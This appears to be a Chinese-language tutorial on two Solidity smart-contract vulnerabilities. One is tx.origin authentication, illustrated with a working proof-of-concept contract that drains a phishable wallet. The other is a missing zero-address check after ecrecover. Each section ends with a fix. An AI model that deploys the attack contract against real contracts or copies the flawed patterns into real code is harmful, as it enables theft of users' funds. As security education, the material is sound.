### 1. tx.origin使用错误

tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。
有关进一步阅读，请参阅[Stack Exchange
Question](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin),[Peter
Venesses博客](https://vessenes.com/tx-origin-and-ethereum-oh-my/)和[Solidity
-
tx.origin攻击](https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514)。

-   案例

``` {.solidity}
contract Phishable {
    address public owner;

    constructor () public {
        owner = msg.sender ; 
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance); 
    }
}
```

该合约有三个函数：constructor构造函数，指定合约owner；fallback函数，通过添加payable关键字以便接收用户转账；withdrawAll函数，对tx.origin进行判断，如果tx.origin是owner，则将合约地址所拥有的ether发送到\_recipient中。

现在，一个攻击者创建了下列合约:

``` {.solidity}
pragma solidity ^0.4.22;
//设置原合约接口，方便调用函数
interface Phishable {
    function owner() external returns (address);
    function withdrawAll(address _recipient) external;
}
//漏洞证明合约
contract POC {
    address owner;
    Phishable phInstance;
    
    constructor() public {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(owner==msg.sender);
        _;
    }
    //指向原合约地址
    function setInstance(address addr) public onlyOwner {
        phInstance = Phishable(addr);
    }
    
    function getBalance() public onlyOwner {
        owner.transfer(address(this).balance);
    }
    
    function attack() internal {
        address phOwner = phInstance.owner();
        if(phOwner == msg.sender){ 
            phInstance.withdrawAll(owner);            
        } else {
            owner.transfer(address(this).balance);
        }
    }
    
    function() external payable {
        attack();
    }
}
```

攻击者诱使原合约(Phishable.sol)的owner发送ether到攻击合约(POC.sol)地址，然后调用攻击合约的fallback函数，执行attack()函数，此时`phOwner == msg.sender`，将会调用原合约的withdrawAll()函数，程序执行进入原合约，此时msg.sender是攻击合约的地址，tx.origin是最初发起交易的地址，即原合约的owner，`require(tx.origin == owner);`条件满足，`_recipient.transfer(this.balance);`可以执行，即将原合约地址里的ether转给攻击者。

-   漏洞修复

tx.origin不应该用于智能合约的授权。
这并不是说永远不应该使用tx.origin变量。
它在智能合约中确实有一些合法的用例。
例如，如果想要拒绝外部合约调用当前合约，他们可以通过require(tx.origin ==
msg.sender)实现。 这可以防止使用中间合约来调用当前合约。

-   参考链接：https://blog.sigmaprime.io/solidity-security.html\#tx-origin

### 2. ecrecover 未作0地址判断

​ `keccak256()` 和  `ecrecover()`都是内嵌的函数， `keccak256()` 可以用于计算公钥的签名， `ecrecover()`可以用来恢复签名公钥。传值正确的情况下，可以利用这两个函数来验证地址。

    //ecrecover接口，利用椭圆曲线签名恢复与公钥相关的地址，错误返回零。
    ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address) 
    
    --------------------------------------------------------------
    bytes32 hash = keccak256(_from,_spender,_value,nonce,name);
    if(_from != ecrecover(hash,_v,_r,_s)) revert();

​ 当`ecrecover`传入错误参数（例如_v = 29,），函数返回0地址。如果合约函数传入的校验地址也为零地址，那么将通过断言，导致合约逻辑错误。

    function transferProxy(address _from, address _to, uint256 _value, uint256 _feeMesh,
        uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){
    
        ...
        
        bytes32 h = keccak256(_from,_to,_value,_feeMesh,nonce,name);
        if(_from != ecrecover(h,_v,_r,_s)) revert();
        
        ...
        return true;
    }

​ 函数`transferProxy`中，如果传入的参数`_from`为0，那么`ecrecover`函数因为输入参数错误而返回0值之后，`if`判断将通过，从而导致合约漏洞。

``` {.solidity}
pragma solidity ^0.4.4;

contract Decode{
  //公匙：0x60320b8a71bc314404ef7d194ad8cac0bee1e331
  //sha3(msg): 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45 (web3.sha3("abc");)
  //签名后的数据：0xf4128988cbe7df8315440adde412a8955f7f5ff9a5468a791433727f82717a6753bd71882079522207060b681fbd3f5623ee7ed66e33fc8e581f442acbcf6ab800

  //验签数据入口函数
  //bytes memory signedString =hex"f4128988cbe7df8315440adde412a8955f7f5ff9a5468a791433727f82717a6753bd71882079522207060b681fbd3f5623ee7ed66e33fc8e581f442acbcf6ab800";
  function decode(bytes signedString) public pure returns (address){

    bytes32  r = bytesToBytes32(slice(signedString, 0, 32));
    bytes32  s = bytesToBytes32(slice(signedString, 32, 32));
    byte  v = slice(signedString, 64, 1)[0];
    return ecrecoverDecode(r, s, v);
  }

  //将原始数据按段切割出来指定长度
  function slice(bytes memory data, uint start, uint len) internal pure returns (bytes){
    bytes memory b = new bytes(len);

    for(uint i = 0; i < len; i++){
      b[i] = data[i + start];
    }

    return b;
  }

  //使用ecrecover恢复公匙
  function ecrecoverDecode(bytes32 r, bytes32 s, byte v1) internal pure returns (address addr){
     uint8 v = uint8(v1) + 27;
     addr = ecrecover(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45, v, r, s);
  }

  //bytes转换为bytes32
  function bytesToBytes32(bytes memory source) internal pure returns (bytes32 result) {
    assembly {
        result := mload(add(source, 32))
    }
  }
}
```

​ 函数 `decode()`传入经过签名后的数据，用于验证返回地址是否是之前用于签名的私钥对应的公钥地址。以太坊提供了`web3.eth.sign`方法来对数据生成数字签名。上面的签名数据可以通过下面的js代码获得：

    //初始化基本对象
    var Web3 = require('web3');
    var web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));
    
    var account = web3.eth.accounts[0];
    var sha3Msg = web3.sha3("abc");
    var signedData = web3.eth.sign(account, sha3Msg);
    
    console.log("account: " + account);
    console.log("sha3(message): " + sha3Msg);
    console.log("Signed data: " + signedData);

​ js代码运行结果如下：

    $ node test.js
    account: 0x60320b8a71bc314404ef7d194ad8cac0bee1e331
    sha3(message): 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    Signed data: 0xf4128988cbe7df8315440adde412a8955f7f5ff9a5468a791433727f82717a6753bd71882079522207060b681fbd3f5623ee7ed66e33fc8e581f442acbcf6ab800

-   漏洞修复
    对0x0地址做过滤，例如：
```solidity
function transferProxy(address _from, address _to, uint256 _value, uint256 _feeMesh,
    uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){

    ...
    require(_from != 0x0);  // 待校验的地址不为0
    bytes32 h = keccak256(_from,_to,_value,_feeMesh,nonce,name);
    if(_from != ecrecover(h,_v,_r,_s)) revert();
    
    ...
    return true;
}
```
-   参考资料
    -   [transferProxy-keccak256](https://github.com/sec-bit/awesome-buggy-erc20-tokens/blob/master/ERC20_token_issue_list_CN.md#a12-transferproxy-keccak256)
    -   [approveProxy-keccak256](https://github.com/sec-bit/awesome-buggy-erc20-tokens/blob/master/ERC20_token_issue_list_CN.md#a13-approveproxy-keccak256)